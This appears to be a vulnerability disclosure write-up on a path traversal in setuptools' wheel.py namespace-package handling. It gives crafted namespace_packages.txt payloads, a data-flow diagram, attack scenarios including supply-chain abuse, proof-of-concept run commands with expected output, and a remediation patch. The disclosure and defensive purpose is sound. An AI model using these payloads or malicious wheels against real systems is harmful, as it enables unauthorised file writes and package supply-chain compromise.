# Deep Dive: Namespace Package Path Traversal in wheel.py

## Executive Summary

This document provides a comprehensive technical analysis of a path traversal vulnerability in setuptools' `wheel.py` module. The vulnerability allows an attacker to write files to arbitrary locations on the filesystem by including malicious entries in a wheel's `namespace_packages.txt` metadata file.

**This is a DIFFERENT vulnerability from the `package_index.py` absolute path injection documented in the parent directory.**

---

## Vulnerability Overview

| Field | Value |
|-------|-------|
| **Component** | `setuptools/wheel.py` |
| **Vulnerable Function** | `Wheel._fix_namespace_packages()` |
| **Lines** | 224-236 |
| **CWE Classification** | CWE-22 (Path Traversal) |
| **Attack Vector** | Malicious wheel package |
| **Impact** | Arbitrary directory creation + file write |
| **Tested Version** | setuptools 78.1.0 |

### Root Cause Summary

The vulnerability exists because:

1. `namespace_packages.txt` content is read from the wheel without validation
2. Each entry is split by `.` (intended for dotted package names like `foo.bar`)
3. The result is passed to `os.path.join(destination, *parts)`
4. If any part contains `/` or is absolute, `os.path.join` produces an escaped path
5. Directories and files are created at the attacker-controlled location

---

## Affected Code Analysis

### Function: `_fix_namespace_packages()` (Lines 224-236)

```python
@staticmethod
def _fix_namespace_packages(egg_info, destination_eggdir):
    namespace_packages = os.path.join(egg_info, 'namespace_packages.txt')
    if os.path.exists(namespace_packages):
        namespace_packages = _read_utf8_with_fallback(namespace_packages).split()

        for mod in namespace_packages:
            mod_dir = os.path.join(destination_eggdir, *mod.split('.'))  # VULNERABLE
            mod_init = os.path.join(mod_dir, '__init__.py')
            if not os.path.exists(mod_dir):
                os.mkdir(mod_dir)                                         # SINK: Directory creation
            if not os.path.exists(mod_init):
                with open(mod_init, 'w', encoding="utf-8") as fp:
                    fp.write(NAMESPACE_PACKAGE_INIT)                      # SINK: File write
```

### Line-by-Line Analysis

| Line | Code | Purpose | Security Issue |
|------|------|---------|----------------|
| 225 | `namespace_packages = os.path.join(egg_info, 'namespace_packages.txt')` | Locate metadata file | None |
| 227 | `namespace_packages = _read_utf8_with_fallback(...).split()` | Read and parse entries | **No validation of content** |
| 230 | `mod_dir = os.path.join(destination_eggdir, *mod.split('.'))` | Construct directory path | **VULNERABLE: split('.') doesn't handle '/'** |
| 233 | `os.mkdir(mod_dir)` | Create namespace directory | **SINK: Creates arbitrary directory** |
| 235 | `open(mod_init, 'w')` | Create `__init__.py` | **SINK: Writes arbitrary file** |

---

## The Vulnerability Mechanics

### Expected Behavior (Legitimate Namespace Package)

```python
# namespace_packages.txt contains: "foo.bar.baz"
mod = "foo.bar.baz"
parts = mod.split('.')           # ['foo', 'bar', 'baz']
mod_dir = os.path.join(dest, *parts)
# Result: /dest/foo/bar/baz
```

### Exploited Behavior (Malicious Payload)

**Payload 1: Absolute Path**
```python
# namespace_packages.txt contains: "/tmp/pwned"
mod = "/tmp/pwned"
parts = mod.split('.')           # ['/tmp/pwned']
mod_dir = os.path.join(dest, '/tmp/pwned')
# Result: /tmp/pwned  (absolute path takes precedence!)
```

**Payload 2: Embedded Path with Dots**
```python
# namespace_packages.txt contains: "/etc/cron.d"
mod = "/etc/cron.d"
parts = mod.split('.')           # ['/etc/cron', 'd']
mod_dir = os.path.join(dest, '/etc/cron', 'd')
# Result: /etc/cron/d  (absolute path wins!)
```

**Payload 3: Path Traversal via Encoded Dots**
```python
# namespace_packages.txt contains: "../../../tmp/pwned"
mod = "../../../tmp/pwned"
parts = mod.split('.')           # ['', '', '/', '', '/', '', '/tmp/pwned']
mod_dir = os.path.join(dest, '', '', '/', '', '/', '', '/tmp/pwned')
# Result: /tmp/pwned  (multiple absolute components, last one wins)
```

### Python's os.path.join Behavior

From Python documentation:
> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

```python
>>> import os
>>> os.path.join('/safe/dir', '/etc/passwd')
'/etc/passwd'  # First argument IGNORED!

>>> os.path.join('/safe/dir', 'a', '/', 'b', '/tmp/evil')
'/tmp/evil'    # All previous components discarded!
```

---

## Complete Data Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACKER-CONTROLLED                                │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  1. MALICIOUS WHEEL FILE                                                     │
│     malicious-1.0-py3-none-any.whl                                          │
│     └── malicious-1.0.dist-info/                                            │
│         └── namespace_packages.txt  ← Contains: "/tmp/pwned"                │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  2. ENTRY POINTS                                                             │
│                                                                              │
│  A) easy_install.py:1114 - easy_install malicious.whl                       │
│  B) installer.py:112     - Build dependency during pip install              │
│  C) Direct API usage     - wheel.install_as_egg(destination)                │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  3. wheel.py:119-132 - install_as_egg()                                     │
│                                                                              │
│     with zipfile.ZipFile(self.filename) as zf:                              │
│         self._install_as_egg(destination_eggdir, zf)                        │
│                                                                              │
│     def _install_as_egg(self, destination_eggdir, zf):                      │
│         ...                                                                  │
│         self._convert_metadata(...)  ← ZIP extracted safely                 │
│         self._fix_namespace_packages(egg_info, destination_eggdir)  ← VULN! │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  4. wheel.py:224-236 - _fix_namespace_packages() [VULNERABLE]               │
│                                                                              │
│     namespace_packages = _read_utf8_with_fallback(...).split()              │
│                          ▲                                                   │
│                          └── Returns: ["/tmp/pwned"]                        │
│                                                                              │
│     for mod in namespace_packages:                                          │
│         mod_dir = os.path.join(destination_eggdir, *mod.split('.'))         │
│                   ▲                                                          │
│                   │ mod.split('.') = ['/tmp/pwned']                         │
│                   │ os.path.join('/eggs/pkg.egg', '/tmp/pwned')             │
│                   │              ▲                                           │
│                   │              └── ABSOLUTE PATH WINS                      │
│                   └── Result: '/tmp/pwned'                                  │
│                                                                              │
│         os.mkdir(mod_dir)           ← CREATES /tmp/pwned/                   │
│         with open(mod_init, 'w'):                                           │
│             fp.write(NAMESPACE_PACKAGE_INIT)  ← WRITES FILE                 │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  5. RESULT                                                                   │
│                                                                              │
│     Created: /tmp/pwned/__init__.py                                         │
│     Content: __import__('pkg_resources').declare_namespace(__name__)        │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Why ZIP Extraction Didn't Catch This

The `archive_util.py` extraction has path traversal protection:

```python
# archive_util.py:118-120
if name.startswith('/') or '..' in name.split('/'):
    continue  # Skip dangerous filenames
```

**But this only validates ZIP entry FILENAMES, not file CONTENTS.**

The `namespace_packages.txt` file has a safe name—the malicious data is **inside** the file and processed **after** extraction.

---

## Proof of Concept Payloads

| Payload | `split('.')` Result | Final Path |
|---------|---------------------|------------|
| `/tmp/pwned` | `['/tmp/pwned']` | `/tmp/pwned` |
| `/etc/cron.d` | `['/etc/cron', 'd']` | `/etc/cron/d` |
| `../../../tmp/evil` | `['', '', '/', '', '/', '', '/tmp/evil']` | `/tmp/evil` |
| `foo/../../etc/x` | `['foo/', '', '/', '', '/etc/x']` | `/etc/x` |

---

## Exploitation Constraints

1. **File content is fixed**: Always writes:
   ```python
   __import__('pkg_resources').declare_namespace(__name__)
   ```

2. **Parent directories must exist**: `os.mkdir()` only creates the final component

3. **Permissions required**: Process must have write access to target

4. **Only creates `__init__.py`**: Filename is not attacker-controlled

---

## Attack Scenarios

### Scenario 1: Local Privilege Escalation

```
Attacker creates malicious wheel with namespace: /tmp/shared_dir
Victim installs wheel as privileged user
Result: Directory created in shared location, potential for further exploitation
```

### Scenario 2: Build-time Attack

```
Malicious package listed as build dependency
Victim runs: pip install legitimate-package
Setuptools fetches build deps → triggers vulnerability
Result: Attacker writes files during build process
```

### Scenario 3: Supply Chain Attack

```
Attacker compromises popular package on PyPI
Adds malicious namespace_packages.txt to wheel
All downstream users affected when using easy_install or wheel-to-egg conversion
```

---

## Comparison with package_index.py Vulnerability

| Aspect | package_index.py | wheel.py (this vuln) |
|--------|------------------|----------------------|
| **Location** | `_download_url()` | `_fix_namespace_packages()` |
| **Source** | URL-encoded path in link | Content of `namespace_packages.txt` |
| **Trigger** | Package download | Wheel-to-egg installation |
| **Content Control** | Full (attacker serves file) | Fixed (`NAMESPACE_PACKAGE_INIT`) |
| **Attack Vector** | Malicious package index | Malicious wheel file |

---

## Remediation

```python
@staticmethod
def _fix_namespace_packages(egg_info, destination_eggdir):
    namespace_packages = os.path.join(egg_info, 'namespace_packages.txt')
    if os.path.exists(namespace_packages):
        namespace_packages = _read_utf8_with_fallback(namespace_packages).split()

        for mod in namespace_packages:
            # FIX 1: Validate each component is a valid Python identifier
            parts = mod.split('.')
            for part in parts:
                if not part.isidentifier():
                    raise ValueError(f"Invalid namespace package name: {mod}")

            mod_dir = os.path.join(destination_eggdir, *parts)

            # FIX 2: Verify path is under destination
            real_mod_dir = os.path.realpath(mod_dir)
            real_dest = os.path.realpath(destination_eggdir)
            if not real_mod_dir.startswith(real_dest + os.sep):
                raise ValueError(f"Namespace package escapes destination: {mod}")

            mod_init = os.path.join(mod_dir, '__init__.py')
            if not os.path.exists(mod_dir):
                os.mkdir(mod_dir)
            if not os.path.exists(mod_init):
                with open(mod_init, 'w', encoding="utf-8") as fp:
                    fp.write(NAMESPACE_PACKAGE_INIT)
```

---

## Files in This Directory

```
namespace_packages_vuln/
├── RESEARCH.md                     # This document
├── build_malicious_wheel.py        # Script to create malicious wheel
├── exploit_test.py                 # Script to trigger and verify vulnerability
└── malicious-1.0-py3-none-any.whl  # Pre-built malicious wheel
```

---

## Running the PoC

```bash
# Clean up any previous test
rm -rf /tmp/pwned_by_namespace_traversal

# Run the exploit (uses local setuptools source)
python3 exploit_test.py

# Verify the result
ls -la /tmp/pwned_by_namespace_traversal/
cat /tmp/pwned_by_namespace_traversal/__init__.py
```

### Expected Output

```
======================================================================
Namespace Package Path Traversal PoC
======================================================================

[*] Before exploit:
    /tmp/pwned_by_namespace_traversal exists? False

[*] Installing wheel to: /tmp/tmpXXXXX/malicious-1.0-py3.egg
    Wheel: ./malicious-1.0-py3-none-any.whl

[*] Installation complete!

[*] After exploit:
    /tmp/pwned_by_namespace_traversal exists? True

[!] VULNERABILITY CONFIRMED!
    Path traversal successfully wrote outside egg directory!

[*] Contents of /tmp/pwned_by_namespace_traversal/__init__.py:
    "__import__('pkg_resources').declare_namespace(__name__)\n"
```

---

## References

- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Python os.path.join documentation](https://docs.python.org/3/library/os.path.html#os.path.join)
- [PEP 420 - Implicit Namespace Packages](https://peps.python.org/pep-0420/)
- [setuptools GitHub Repository](https://github.com/pypa/setuptools)
